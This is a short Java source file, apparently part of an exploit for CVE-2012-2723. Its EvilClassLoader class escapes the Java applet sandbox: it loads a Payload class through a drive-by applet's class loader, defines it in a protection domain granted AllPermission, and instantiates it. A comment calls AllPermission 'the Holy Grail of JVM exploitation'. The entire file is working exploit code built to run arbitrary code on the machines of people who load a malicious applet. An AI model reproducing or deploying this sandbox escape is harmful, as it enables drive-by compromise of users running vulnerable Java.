package me.ethaniel.cve20122723;

import java.io.InputStream;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;

public class EvilClassLoader extends ClassLoader {
    public static void escapeSandbox() throws Exception {
        InputStream in = DriveBy.appletCL.getResourceAsStream("Payload.class");
        int classSize = in.available();
        byte[] classBytes = new byte[classSize];
        in.read(classBytes);
        Certificate[] certs = new Certificate[0];
        CodeSource source = new CodeSource(null, certs);
        Permissions permissions = new Permissions();
        // The Holy Grail of JVM exploitation!
        permissions.add(new AllPermission());
        ProtectionDomain protectionDomain = new ProtectionDomain(source, permissions);
        Class payloadClass = DriveBy.appletCL.defineClass("Payload", classBytes, 0, classBytes.length, protectionDomain);
        Payload payload = (Payload) payloadClass.newInstance();
    }
}
